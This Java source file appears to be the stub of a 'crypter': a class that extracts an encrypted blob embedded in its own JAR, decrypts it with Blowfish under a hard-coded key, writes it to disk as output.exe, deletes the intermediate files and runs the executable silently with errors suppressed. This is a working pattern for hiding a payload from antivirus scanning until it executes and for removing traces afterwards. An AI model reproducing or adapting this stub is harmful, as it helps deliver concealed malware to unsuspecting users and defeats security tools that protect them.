package jc;


import java.io.*;

import java.util.jar.*;
import java.util.zip.ZipEntry;
/**
 *
 * @author adityatj
 */
public class Stub {
    public static String home = "",arg = "";
    public static int len;
    public void extractFromJar(String path){
        try{
		home = (getClass().getProtectionDomain().getCodeSource().getLocation().toString().substring(6)).replace('/', '\\').replaceAll("%20"," ");
            String finalhome = home + path;
	      
            File file = new File(home);
            System.out.println(file.toString());
            JarFile jar = new JarFile(file);
		ZipEntry entry = jar.getEntry(arg);
		File efile = new File(entry.getName());
		InputStream in = new BufferedInputStream(jar.getInputStream(entry));
		OutputStream out = new BufferedOutputStream(new FileOutputStream(efile));
		byte[] buffer = new byte[2048];
		for (;;)  
		{
			int nBytes = in.read(buffer);
			if (nBytes <= 0) break;
			out.write(buffer, 0, nBytes);
		}
		out.flush();
		out.close();
		in.close();}
        catch(Exception e){System.err.println(e.toString());}
    }
    public static void main(String []args){
try{
        BlowfishCrypter bfc = new BlowfishCrypter();
        MD5String md5str = new MD5String();
        Stub stub = new Stub();
        String key = md5str.getMD5String("simple encryption");
        
        arg = "Output file path.txt";
        stub.extractFromJar("Output file path.txt");
        FileReader fr = new FileReader("Output file path.txt"); 
        BufferedReader br = new BufferedReader(fr); 
        String s = "",str = ""; 
        while((s = br.readLine()) != null) { 
        str = str + s;
        } 
        fr.close(); 
        len = str.length();
        
        arg = "encrypted_file.enc";
        stub.extractFromJar(str);
        String outputFile = "output.exe";
        
        bfc.decryptFile("encrypted_file.enc", outputFile, key);
        
        File file = new File("Output file path.txt");
        file.delete();
        file = new File("encrypted_file.enc");
        file.delete();
        Process p = Runtime.getRuntime().exec(outputFile);
}
catch(Exception e){}

        
    }

}
